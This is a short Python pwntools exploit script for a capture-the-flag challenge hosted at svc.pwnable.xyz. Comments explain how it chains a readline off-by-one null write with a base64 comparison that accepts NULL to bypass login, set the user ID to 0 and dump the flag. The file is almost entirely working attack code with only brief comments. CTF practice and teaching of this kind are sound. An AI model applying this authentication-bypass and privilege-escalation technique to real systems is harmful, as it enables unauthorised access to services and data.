from pwn import *

###Util
def login(pwd):
    r.sendlineafter('> ','1')
    r.sendafter('Password: ',pwd)

def change_pwd(pwd):
    r.sendlineafter('> ','2')
    r.sendafter('password: ',pwd)

def show_pwd():
    r.sendlineafter('> ','3')

def restore_pwd():
    r.sendlineafter('> ','4')


###Exploit
r = remote('svc.pwnable.xyz',30026)
r.sendlineafter('ID: ','1')
###readline sets buf[strlen(buf)-1] to null, allowing modifying previous adjacent buffers
###when b64decode is performed, if data is corrupted, it return NULL
###However, b64cmp returns success if any parameter is null, this allows us to login by modifying the last byte of flag
login(b'\x00')
###modify uid to 0 with readline bug
change_pwd(b'\x00')
###restore flag and print it
restore_pwd()
show_pwd()

r.interactive()
